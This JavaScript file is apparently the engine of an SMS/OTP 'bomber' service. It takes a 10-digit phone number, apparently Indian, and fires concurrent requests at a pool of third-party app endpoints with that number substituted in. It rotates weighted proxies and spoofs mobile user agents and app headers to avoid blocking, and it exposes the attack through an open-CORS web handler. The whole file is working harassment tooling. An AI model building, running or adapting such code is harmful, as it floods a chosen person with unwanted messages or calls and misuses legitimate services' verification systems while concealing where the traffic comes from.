// language: JavaScript, file: lib/engine.js
import { request, ProxyAgent } from 'undici';
import { poolForMode } from './apis.js';
import { PROXIES } from './proxies.js';
import { pickUserAgent, APP_HEADERS } from './agents.js';

const CONCURRENCY = 25;
const TIMEOUT_MS = 7000;
const RETRIES = 1;

// ─── proxy pool state (per lambda instance, resets on cold start) ───
const proxyState = PROXIES.map(url => ({
  url,
  agent: null,
  fails: 0,
  benchedUntil: 0,
}));

const BENCH_AFTER_FAILS = 3;
const BENCH_MS = 60_000;

function getAgent(entry) {
  if (!entry.agent) {
    entry.agent = new ProxyAgent({
      uri: entry.url,
      connect: { timeout: 5000 },
    });
  }
  return entry.agent;
}

function pickProxy() {
  const now = Date.now();
  const alive = proxyState.filter(p => p.benchedUntil < now);
  if (!alive.length) return null;
  // weighted: fewer fails → higher chance of being picked
  const totalWeight = alive.reduce((s, p) => s + (BENCH_AFTER_FAILS - p.fails + 1), 0);
  let roll = Math.random() * totalWeight;
  for (const p of alive) {
    roll -= (BENCH_AFTER_FAILS - p.fails + 1);
    if (roll <= 0) return p;
  }
  return alive[0];
}

function reportProxyResult(entry, ok) {
  if (!entry) return;
  if (ok) {
    entry.fails = Math.max(0, entry.fails - 1);
  } else {
    entry.fails += 1;
    if (entry.fails >= BENCH_AFTER_FAILS) {
      entry.benchedUntil = Date.now() + BENCH_MS;
      entry.fails = 0;
    }
  }
}

// ─── request building ───
function sub(str, phone) { return str.replaceAll('{phone10}', phone); }

function deepSub(obj, phone) {
  if (obj == null) return obj;
  if (typeof obj === 'string') return sub(obj, phone);
  if (Array.isArray(obj)) return obj.map(v => deepSub(v, phone));
  if (typeof obj === 'object') {
    const out = {};
    for (const [k, v] of Object.entries(obj)) out[k] = deepSub(v, phone);
    return out;
  }
  return obj;
}

function buildRequest(api, phone) {
  const url = sub(api.url, phone);
  const method = api.method || (api.body ? 'POST' : 'GET');

  // base headers — realistic mobile app shape
  const headers = {
    'user-agent': pickUserAgent(),
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-IN,en;q=0.9',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive',
    ...(APP_HEADERS[api.name] || {}),
    ...(api.headers || {}),
  };

  let body;
  if (api.body && method !== 'GET') {
    const payload = deepSub(api.body, phone);
    if (api.json !== false) {
      headers['content-type'] = 'application/json';
      body = JSON.stringify(payload);
    } else {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      body = new URLSearchParams(payload).toString();
    }
  }
  return { url, method, headers, body };
}

// ─── single endpoint fire ───
async function fireOne(api, phone, useProxy) {
  for (let attempt = 0; attempt <= RETRIES; attempt++) {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), TIMEOUT_MS);

    const proxyEntry = useProxy ? pickProxy() : null;
    const dispatcher = proxyEntry ? getAgent(proxyEntry) : undefined;

    try {
      const { url, method, headers, body } = buildRequest(api, phone);
      const res = await request(url, {
        method, headers, body,
        signal: ctrl.signal,
        dispatcher,
      });
      await res.body.dump();
      clearTimeout(timer);

      const ok = res.statusCode >= 200 && res.statusCode < 400;

      // 4xx from target = proxy worked, target blocked. Don't penalize proxy.
      if (proxyEntry) {
        if (res.statusCode > 0) {
          // any HTTP response means the proxy tunnel succeeded
          proxyEntry.fails = Math.max(0, proxyEntry.fails - 1);
        } else {
          reportProxyResult(proxyEntry, ok);
        }
      }

      return {
        name: api.name,
        status: res.statusCode,
        ok,
        via: proxyEntry ? 'proxy' : 'direct',
      };
    } catch (err) {
      clearTimeout(timer);

      if (proxyEntry) {
        reportProxyResult(proxyEntry, false);
        if (attempt < RETRIES) continue;
      }

      if (attempt === RETRIES) {
        return {
          name: api.name,
          status: 0,
          ok: false,
          error: err.code || err.message,
          via: proxyEntry ? 'proxy' : 'direct',
        };
      }
    }
  }
}

// ─── main runner ───
export async function runBomb({ phone, mode, useProxy = true }) {
  if (!/^\d{10}$/.test(phone)) throw new Error('phone must be 10 digits');

  const pool = [...poolForMode(mode)].sort(() => Math.random() - 0.5);
  const results = [];
  let cursor = 0;

  async function worker() {
    while (cursor < pool.length) {
      const idx = cursor++;
      results.push(await fireOne(pool[idx], phone, useProxy));
    }
  }

  const started = Date.now();
  await Promise.all(Array.from({ length: Math.min(CONCURRENCY, pool.length) }, worker));
  const ok = results.filter(r => r.ok).length;
  const viaProxy = results.filter(r => r.via === 'proxy').length;
  const viaDirect = results.filter(r => r.via === 'direct').length;

  return {
    mode,
    number: phone,
    total: results.length,
    success: ok,
    failed: results.length - ok,
    via_proxy: viaProxy,
    via_direct: viaDirect,
    proxies_configured: PROXIES.length,
    duration_ms: Date.now() - started,
    results: results.map(r => ({
      name: r.name,
      status: r.status,
      ok: r.ok,
      via: r.via,
    })),
  };
}

export async function handle(req, res, mode) {
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-methods', 'GET, OPTIONS');
  res.setHeader('access-control-allow-headers', 'content-type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const phone = (req.query.number || '').toString();
  const useProxy = req.query.noproxy !== '1';

  if (!/^\d{10}$/.test(phone)) {
    return res.status(400).json({ ok: false, error: 'number must be 10 digits', got: phone });
  }

  try {
    const out = await runBomb({ phone, mode, useProxy });
    return res.status(200).json({ ok: true, ...out });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }
}